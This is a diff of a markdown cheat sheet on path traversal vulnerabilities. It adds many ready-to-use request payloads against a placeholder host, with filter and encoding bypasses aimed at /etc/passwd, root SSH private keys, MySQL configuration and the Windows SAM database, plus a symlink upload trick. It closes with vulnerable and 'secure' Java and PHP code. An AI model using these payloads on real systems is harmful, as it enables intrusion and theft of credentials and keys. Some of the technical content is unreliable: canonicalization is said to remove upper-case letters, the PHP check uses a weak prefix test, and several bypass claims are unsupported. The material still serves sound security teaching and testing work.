@@ -14,9 +14,9 @@ To ensure precise classification during documentation, reporting, and threat mod
 * **CWE-22 (Primary)**: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') — The foundational flaw where an application fails to properly sanitize user-controlled file paths.
 * **CWE-23 (Child)**: Relative Path Traversal — The use of directory traversal sequences (such as `../`) to access file locations outside the intended directory.
 * **CWE-36 (Child)**: Absolute Path Traversal — The direct provision of fully qualified file locations without using relative traversal tokens.
-* **OWASP Top 10 Reference**
-* A03:2021-Injection — Classified under the Injection category due to the insecure evaluation of untrusted user input within structural file systems.
-* A05:2021 Security Misconfiguration (Context Dependent)
+* **OWASP Top 10 Reference**:
+  - A03:2021 - Injection — Classified under the Injection category due to the insecure evaluation of untrusted user input within structural file systems.
+  - A05:2021 - Security Misconfiguration (Context Dependent)
 
 ---
 
@@ -45,7 +45,7 @@ This vulnerability occurs when a programming framework utilizes naive string man
 
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com
+  https://vulnerable-target.com/file?path=../../../etc/passwd
   ```
 
 ---
@@ -61,7 +61,7 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `../../../etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com
+  https://vulnerable-target.com/file?path=../../../etc/passwd
   ```
 
 #### 2. Windows Cross-Compatible Traversal
@@ -69,7 +69,7 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `..\..\..\windows\win.ini`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com..\..\..\windows\win.ini
+  https://vulnerable-target.com/file?path=..\..\..\windows\win.ini
   ```
 
 #### 3. Absolute Path Override
@@ -77,15 +77,15 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `/etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com/etc/passwd
+  https://vulnerable-target.com/file?path=/etc/passwd
   ```
 
 #### 4. Non-Recursive Strip Bypass
-* **Explanation**: Exploits simple single-pass filters (`.replace("../", "")`). The inner token is removed by the application, collapsing the remaining outer characters into a valid `../` sequence.
+* **Explanation**: Exploits simple single-pass filters (`.replace("../", "")`). The first `../` is removed by the application, collapsing `....//` into a valid `../` sequence that remains after filtering.
 * **Payload**: `....//....//....//etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com....//....//....//etc/passwd
+  https://vulnerable-target.com/file?path=....//....//....//etc/passwd
   ```
 
 #### 5. Split Dot Injection
@@ -93,7 +93,7 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `..././..././..././etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com..././..././..././etc/passwd
+  https://vulnerable-target.com/file?path=..././..././..././etc/passwd
   ```
 
 #### 6. Multi-Layer Nesting
@@ -101,7 +101,7 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `......//......//......//etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com......//......//......//etc/passwd
+  https://vulnerable-target.com/file?path=......//......//......//etc/passwd
   ```
 
 #### 7. Single URL Encoding
@@ -109,7 +109,7 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+  https://vulnerable-target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
   ```
 
 #### 8. Double URL Encoding
@@ -117,15 +117,15 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+  https://vulnerable-target.com/file?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
   ```
 
 #### 9. Overlong UTF-8 Encoding
-* **Explanation**: Employs non-standard multi-byte representations of the slash character (`/`). This trips basic ASCII character-matching web application firewalls while resolving normally inside Unicode-aware file APIs.
-* **Payload**: `..%c0%af..%c0%af..%c0%afetc/passwd`
+* **Explanation**: Employs non-standard multi-byte representations of the dot (`.`) and slash (`/`) characters. This trips basic ASCII character-matching web application firewalls while resolving normally inside Unicode-aware file APIs.
+* **Payload**: `%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com..%c0%af..%c0%af..%c0%afetc/passwd
+  https://vulnerable-target.com/file?path=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
   ```
 
 #### 10. Null Byte Injection
@@ -133,7 +133,31 @@ Applications often implement input filters to block directory traversal sequence
 * **Payload**: `../../../etc/passwd%00.png`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com%00.png
+  https://vulnerable-target.com/file?path=../../../etc/passwd%00.png
+  ```
+* **⚠️ Critical Note**: Null byte injection (`%00`) only works in:
+  - PHP versions < 7.0
+  - Older C/C++ applications
+  - NOT supported in PHP 7+, Python 3+, modern Node.js
+
+#### 11. Symlink Bypass
+* **Explanation**: If the application allows reading files within a directory that contains symbolic links, attackers can create symlinks pointing outside the sandbox.
+* **Payload**: `symlink_to_/etc/passwd`
+* **Example**:
+  ```bash
+  # Attacker creates symlink on server (if they have upload access)
+  ln -s /etc/passwd uploads/symlink_to_passwd
+  
+  # Then read via:
+  https://vulnerable-target.com/file?path=symlink_to_passwd
+  ```
+
+#### 12. Windows UNC Path Bypass
+* **Explanation**: Windows supports Universal Naming Convention (UNC) paths that reference network shares. Some filters don't block backslash-at-start patterns.
+* **Payload**: `\\127.0.0.1\c$\windows\win.ini`
+* **Example Implementation**:
+  ```http
+  https://vulnerable-target.com/file?path=\\127.0.0.1\c$\windows\win.ini
   ```
 
 ---
@@ -150,13 +174,31 @@ In-band vulnerabilities present the contents of the file directly within the HTT
 * **Payload (Hosts)**: `../../../../etc/hosts`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com../../../../etc/hosts
+  https://vulnerable-target.com/file?path=../../../../etc/hosts
   ```
 * **Explanation**: Targets the environment file of the current active process to read sensitive internal system paths, configurations, and runtime variables.
 * **Payload (Environment)**: `../../../../proc/self/environ`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com../../../../proc/self/environ
+  https://vulnerable-target.com/file?path=../../../../proc/self/environ
+  ```
+* **Explanation (Additional)**: Targets Apache configuration for server settings and virtual host definitions.
+* **Payload (Apache Config)**: `../../../../etc/apache2/apache2.conf`
+* **Example Implementation**:
+  ```http
+  https://vulnerable-target.com/file?path=../../../../etc/apache2/apache2.conf
+  ```
+* **Explanation (Additional)**: Targets SSH private keys for authentication compromise.
+* **Payload (SSH Keys)**: `../../../../root/.ssh/id_rsa`
+* **Example Implementation**:
+  ```http
+  https://vulnerable-target.com/file?path=../../../../root/.ssh/id_rsa
+  ```
+* **Explanation (Additional)**: Targets MySQL configuration for database credentials.
+* **Payload (MySQL Config)**: `../../../../etc/mysql/mysql.conf.d/mysqld.cnf`
+* **Example Implementation**:
+  ```http
+  https://vulnerable-target.com/file?path=../../../../etc/mysql/mysql.conf.d/mysqld.cnf
   ```
 
 #### 🎯 Windows Target Files
@@ -164,13 +206,25 @@ In-band vulnerabilities present the contents of the file directly within the HTT
 * **Payload (Unattend Logs)**: `..\..\..\..\..\..\windows\panther\unattend.xml`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com..\..\..\..\..\..\windows\panther\unattend.xml
+  https://vulnerable-target.com/file?path=..\..\..\..\..\..\windows\panther\unattend.xml
   ```
 * **Explanation**: Accesses the native Windows local network configuration file to trace hostname configurations and internal asset definitions.
 * **Payload (Hosts)**: `..\..\..\windows\system32\drivers\etc\hosts`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com..\..\..\windows\system32\drivers\etc\hosts
+  https://vulnerable-target.com/file?path=..\..\..\windows\system32\drivers\etc\hosts
+  ```
+* **Explanation (Additional)**: Targets Windows SAM database for user account hashes.
+* **Payload (SAM Database)**: `..\..\..\windows\system32\config\SAM`
+* **Example Implementation**:
+  ```http
+  https://vulnerable-target.com/file?path=..\..\..\windows\system32\config\SAM
+  ```
+* **Explanation (Additional)**: Targets boot configuration for system settings.
+* **Payload (Boot.ini)**: `..\..\..\boot.ini`
+* **Example Implementation**:
+  ```http
+  https://vulnerable-target.com/file?path=..\..\..\boot.ini
   ```
 
 ---
@@ -186,7 +240,7 @@ When simple injection payloads are blocked, the application may be enforcing str
 * **Payload**: `/var/www/images/../../../etc/passwd`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com/var/www/images/../../../etc/passwd
+  https://vulnerable-target.com/file?path=/var/www/images/../../../etc/passwd
   ```
 
 #### 🎯 2. Static Extension Enforcement (Null Byte Architecture)
@@ -195,7 +249,7 @@ When simple injection payloads are blocked, the application may be enforcing str
 * **Payload**: `../../../etc/passwd%00.png`
 * **Example Implementation**:
   ```http
-  https://vulnerable-target.com../../../etc/passwd%00.png
+  https://vulnerable-target.com/file?path=../../../etc/passwd%00.png
   ```
 
 ---
@@ -259,3 +313,77 @@ def secure_file_request(user_supplied_filename):
         return "Access Control Exception: Path Traversal Attempt Blocked!"
 ```
 
+### Why Canonicalization Works
+Path canonicalization (resolve() in Python, realpath() in PHP) performs:
+1. **Absolute path conversion**: Converts relative paths to absolute
+2. **Shortcut resolution**: Flattens `../`, `./`, `//` sequences
+3. **Symlink following**: Resolves symbolic links to actual paths
+4. **Normalization**: Removes redundant separators and upper-case letters
+
+After canonicalization, `../` is gone - it's converted to the actual parent directory path.
+
+---
+
+### Vulnerable Java Implementation
+```java
+// ❌ VULNERABLE
+public String readFile(String userFilename) {
+    String baseDir = "/var/www/images/";
+    String fullPath = baseDir + userFilename;  // ❌ No validation
+    
+    File file = new File(fullPath);
+    return Files.readString(file.toPath());
+}
+```
+
+### Secure Java Implementation
+```java
+// ✅ SECURE
+public String readFile(String userFilename) {
+    Path baseDir = Paths.get("/var/www/images/").normalize();
+    Path userPath = Paths.get(userFilename).normalize();
+    Path fullPath = baseDir.resolve(userPath).normalize();
+    
+    // Verify path starts with base directory
+    if (!fullPath.startsWith(baseDir)) {
+        throw new SecurityException("Path traversal detected!");
+    }
+    
+    return Files.readString(fullPath);
+}
+```
+
+### PHP Secure Implementation
+```php
+// ✅ SECURE
+function secureFileRead($userFilename) {
+    $baseDir = '/var/www/images/';
+    
+    // Build full path
+    $fullPath = $baseDir . $userFilename;
+    
+    // Canonicalize (resolve ../, ./, symlinks)
+    $realPath = realpath($fullPath);
+    $realBase = realpath($baseDir);
+    
+    // Verify path is within base directory
+    if ($realPath === false || strpos($realPath, $realBase) !== 0) {
+        throw new SecurityException("Path traversal blocked!");
+    }
+    
+    return file_get_contents($realPath);
+}
+```
+
+---
+
+### Web Server-Specific Traversal
+
+| Server | Traversal Pattern | Notes |
+|--------|-----------------|-------|
+| Apache | `../../%20` (space) | Trailing space bypasses some filters |
+| Nginx | `..%2f..%2f` (URL-encoded) | Older versions vulnerable |
+| IIS | `..\..\` (backslash) | Windows-native traversal |
+| Tomcat | `..\/..\/` (mixed) | Mixed slash bypass |
+
+---
